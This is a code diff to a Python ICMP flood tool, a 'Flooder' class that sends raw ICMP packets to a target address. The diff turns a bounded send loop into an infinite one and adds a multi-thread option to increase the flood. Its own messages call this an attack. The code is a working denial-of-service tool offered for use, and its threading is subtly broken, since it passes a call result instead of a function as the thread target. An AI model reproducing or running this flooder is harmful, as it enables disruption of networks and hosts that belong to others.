@@ -4,6 +4,7 @@ import string
 import struct
 import socket
 import argparse
+from threading import Thread, Event
 
 class Flooder:
     # Check data, calculated from the ICMP header and data
@@ -23,19 +24,12 @@ class Flooder:
         return header + data
 
     # Create socket to send packets to specified ip address
-    # Close the created socket after using
+    #  and close the created socket after using
     def create_socket(self, ip, port, length, freq):
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
         socket.inet_aton(ip)
-        
-        # This loop if for sending packet specified times
-        #for i in range(0, 6):
-        #    packet = self.construct_packet(length, freq)
-        #    sock.sendto(packet, (ip, port))
-        #    time.sleep(freq * 10)
 
-        # This loop is for sending packet to target infinitely
-        for i in range(0, 10):
+        while(True):
             packet = self.construct_packet(length)
             sock.sendto(packet, (ip, port))
             time.sleep(freq)
@@ -52,6 +46,7 @@ class Flooder:
         parser.add_argument('-p', help='Specify port number', metavar='', default=69, type=int)
         parser.add_argument('-l', help='Specify packet length', metavar='', default=60, type =int)
         parser.add_argument('-f', help='Specify value of frequence to send packet', metavar='', default=0.01, type=float)
+        parser.add_argument('-t', help='Count thread', metavar='', default=1, type=int)
         args = parser.parse_args()
 
         # Try to get ip address of destination (by url too)
@@ -87,7 +82,20 @@ class Flooder:
         else:
             print("Specific count: ", float(args.f))
 
-        self.create_socket(ip_addr, int(args.p), int(args.l), float(args.f))
+        try:
+            evnt = Event()
+            threads = []
+            for i in range(args.t):
+                thrd = Thread(target=self.create_socket(ip_addr, int(args.p), int(args.l), float(args.f)))
+                thrd.daemon = True
+                thrd.start()
+                threads.append(thrd)
+        except KeyboardInterrupt:
+            evnt.set()
+            print('\t Stop open threads ...\n')
+            for thrd in threads:
+                thrd._stop()
+            print('\t Attack has been stopped!\n')
 
 if __name__ == "__main__":
     flood = Flooder()
